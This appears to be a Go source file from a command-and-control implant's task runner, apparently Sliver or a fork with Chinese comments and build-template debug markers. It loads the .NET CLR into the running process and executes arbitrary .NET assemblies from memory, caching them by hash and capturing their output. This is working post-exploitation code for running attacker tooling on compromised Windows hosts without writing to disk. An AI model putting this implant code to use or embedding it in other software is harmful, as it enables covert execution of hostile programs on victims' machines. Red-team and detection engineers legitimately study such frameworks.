//go:build windows
// +build windows

package taskrunner

import (
	"crypto/sha256"
	"errors"
	"fmt"
	clr "github.com/Ne0nd0g/go-clr"
	"sync"
	// {{if .Config.Debug}}
	"log"
	// {{end}}
)

var (
	clrInstance *CLRInstance
	assemblies  []*assembly
)

type assembly struct {
	methodInfo *clr.MethodInfo
	hash       [32]byte
}

type CLRInstance struct {
	runtimeHost *clr.ICORRuntimeHost
	sync.Mutex
}

func (c *CLRInstance) GetRuntimeHost(runtime string) *clr.ICORRuntimeHost {
	c.Lock()
	defer c.Unlock()
	if c.runtimeHost == nil {
		// {{if .Config.Debug}}
		log.Printf("Initializing CLR runtime host")
		// {{end}}
		c.runtimeHost, _ = clr.LoadCLR(runtime)
		err := clr.RedirectStdoutStderr()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("could not redirect stdout/stderr: %v\n", err)
			// {{end}}
		}
	}
	return c.runtimeHost
}

// 调用go-clr
// 第一次执行时，会将.net程序加载进去执行，并且计算、存储整体的hash
// 后续执行时，会先判断hash是否存在，存在则不进行第二次加载
func LoadAssembly(data []byte, assemblyArgs []string, runtime string) (string, error) {
	var (
		methodInfo *clr.MethodInfo
		err        error
	)

	rtHost := clrInstance.GetRuntimeHost(runtime)
	if rtHost == nil {
		return "", errors.New("Could not load CLR runtime host")
	}

	// 看之前有没有加载过
	// 没有的话再进行加载
	if asm := getAssembly(data); asm != nil {
		methodInfo = asm.methodInfo
	} else {
		methodInfo, err = clr.LoadAssembly(rtHost, data)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("could not load assembly: %v\n", err)
			// {{end}}
			return "", err
		}
		addAssembly(methodInfo, data)
	}
	if len(assemblyArgs) == 1 && assemblyArgs[0] == "" {
		// for methods like Main(String[] args), if we pass an empty string slice
		// the clr loader will not pass the argument and look for a method with
		// no arguments, which won't work
		assemblyArgs = []string{" "}
	}
	// {{if .Config.Debug}}
	log.Printf("Assembly loaded, methodInfo: %+v\n", methodInfo)
	log.Printf("Calling assembly with args: %+v\n", assemblyArgs)
	// {{end}}
	stdout, stderr := clr.InvokeAssembly(methodInfo, assemblyArgs)
	// {{if .Config.Debug}}
	log.Printf("Got output: %s\n%s\n", stdout, stderr)
	// {{end}}
	return fmt.Sprintf("%s\n%s", stdout, stderr), nil
}

func addAssembly(methodInfo *clr.MethodInfo, data []byte) {
	asmHash := sha256.Sum256(data)
	asm := &assembly{methodInfo: methodInfo, hash: asmHash}
	assemblies = append(assemblies, asm)
}

func getAssembly(data []byte) *assembly {
	asmHash := sha256.Sum256(data)
	for _, asm := range assemblies {
		if asm.hash == asmHash {
			return asm
		}
	}
	return nil
}

func init() {
	clrInstance = &CLRInstance{}
	assemblies = make([]*assembly, 0)
}
